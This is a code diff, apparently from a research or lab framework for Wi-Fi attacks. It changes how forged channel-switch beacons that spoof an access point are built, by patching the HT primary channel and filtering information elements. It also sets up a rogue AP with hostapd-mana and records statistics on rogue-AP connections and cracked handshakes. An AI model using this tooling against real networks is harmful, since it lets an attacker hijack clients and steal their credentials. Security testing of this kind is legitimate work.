@@ -28,19 +28,71 @@ using namespace chrono;
 
 using namespace observer::tshark;
 
-static Dot11Beacon with_sorted_ies(const Dot11Beacon &src) {
+static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) {
 	auto opts = src.options();
 	vector sorted_opts(opts.begin(), opts.end());
-	// ID 61 (HT Operation) excluded — contains primary channel, conflicts with CSA IE
-	//TODO reuse in mitm
 
-	erase_if(sorted_opts, [](const auto &o) { //FIXME  Sleeep mode ()
+	//TODO dd this to pdf (why is filtered)
+
+	// patch HT_OPERATION primary channel
+	for (auto &o : sorted_opts) {
+		if (o.option() == static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION)) {
+
+			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
+			if (!data.empty()) {
+				data[0] = static_cast<uint8_t>(ap_channel.ch_num); // Primary Channel field
+			}
+			o = Dot11::option(
+				Dot11::OptionTypes::HT_OPERATION,
+				data.size(), data.data());
+		}
+	}
+
+	erase_if(sorted_opts, [](const auto &o) {
 		const auto id = static_cast<uint8_t>(o.option());
-		return id != 0 && id != 1 && id != 3 && id != 5
-			&& id != 37 && id != 42 && id != 45 //&& id != 48 //FIXME to bez tagu 48/61 ho aspoň odpojilo.
-			&& id != 50 && id != 59
-			&& id != 127 && id != 221;
+
+		static constexpr std::array kept_ids = {
+			static_cast<uint8_t>(Dot11::OptionTypes::SSID),
+			static_cast<uint8_t>(Dot11::OptionTypes::SUPPORTED_RATES),
+			static_cast<uint8_t>(Dot11::OptionTypes::DS_SET),
+			static_cast<uint8_t>(Dot11::OptionTypes::TIM),
+			static_cast<uint8_t>(Dot11::OptionTypes::COUNTRY),
+			static_cast<uint8_t>(Dot11::OptionTypes::CHANNEL_SWITCH),
+			static_cast<uint8_t>(Dot11::OptionTypes::ERP_INFORMATION),
+
+			static_cast<uint8_t>(Dot11::OptionTypes::HT_CAPABILITY), // only if HT_OPERATION
+			static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION),
+
+			// should be same as original
+			static_cast<uint8_t>(Dot11::OptionTypes::RSN),
+			static_cast<uint8_t>(Dot11::OptionTypes::EXT_SUPPORTED_RATES),
+			static_cast<uint8_t>(Dot11::OptionTypes::SUPPORTED_OP_CLASSES),
+			static_cast<uint8_t>(Dot11::OptionTypes::EXT_CAP),
+			static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC),
+		};
+		if (ranges::find(kept_ids, id) == kept_ids.end())
+			return true; //erase
+
+		// filter out useless VENDOR_SPECIFIC IE tags
+		// allow only  00:50:F2 (type 1 - Microsoft Qos, type 2- WMM/WME)
+		if (id == static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC)) {
+			// OUI (3B) + type (1B) - Microsoft/WiFi Alliance WPA/WMM
+			static constexpr std::array<uint8_t, 3> ms_oui = {0x00, 0x50, 0xF2};
+
+			const auto *data = o.data_ptr();
+			const auto len = o.data_size();
+			if (len < 4) return true;
+
+			const bool oui_match = std::equal(ms_oui.begin(), ms_oui.end(), data);
+			const uint8_t type = data[3];
+
+			// type 1 = WPA IE, type 2 = WMM/WME
+			const bool wanted_type = (type == 1 || type == 2);
+			return !(oui_match && wanted_type);
+		}
+		return ranges::find(kept_ids, id) == kept_ids.end();
 	});
+
 	ranges::sort(sorted_opts, [](const auto &a, const auto &b) {
 		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
 	});
@@ -59,7 +111,7 @@ static Dot11Beacon with_sorted_ies(const Dot11Beacon &src) {
 }
 
 //FIXME unused ssid, ap_cahnnel
-RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &/*ssid*/, const Channel &/*ap_channel*/,
+RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &/*ssid*/, const Channel &ap_channel,
 						const Channel &new_channel, const int switch_count,
 						const Dot11Beacon *src_beacon
 ){
@@ -71,7 +123,7 @@ RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string &/*ssid*/, cons
 	cs.switch_count = switch_count;
 	b.channel_switch(cs);
 
-	b = with_sorted_ies(b);
+	b = patch_ies(b, ap_channel);
 	b.addr1(Dot11::BROADCAST);
 	b.addr2(ap_mac);
 	b.addr3(ap_mac);
@@ -109,9 +161,6 @@ void setup_chs_attack(RunStatus &rs){
 	// only setup if can
 	components::client_ap_setup(rs, false);
 	components::setup_rogue_ap(rs);
-	if (rs.get_actor("rogue_ap").is(BK::sniff_iface)) {
-		rs.get_actor("rogue_ap")->up_sniff_iface();
-	}
 
 }
 
@@ -169,7 +218,7 @@ void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>
 
 	const path ATT_graph_path = tshark_graph(rs, "attacker", elements);
 	if(!ATT_graph_path.empty()){
-		report << "### ATT (att, hostapd-mana " << hostapd::get_version(rs, "rogue_ap") << ")\n";
+		report << "### ATT (att, hostapd-mana " << hostapd::get_version(rs, "attacker") << ")\n";
 		report << "![ATT Graph](" << ATT_graph_path << ")\n\n";
 	}
 
@@ -230,7 +279,7 @@ void stats_chs_attack(const RunStatus &rs){
 	result["conn_WPA_version"] = visual::helper::get_conn_WPA_version(rs, window_START);
 
 	result["client_scanning"] = visual::helper::get_client_scanning(rs, window);
-	result["rogue_ap_connected"] = rogue_ap_connected.value();
+	result["rogue_ap_connected"] = rogue_ap_connected;
 	if(crack_result) {
 		result["cracked"] = crack_result.value().cracked != 0;
 	}
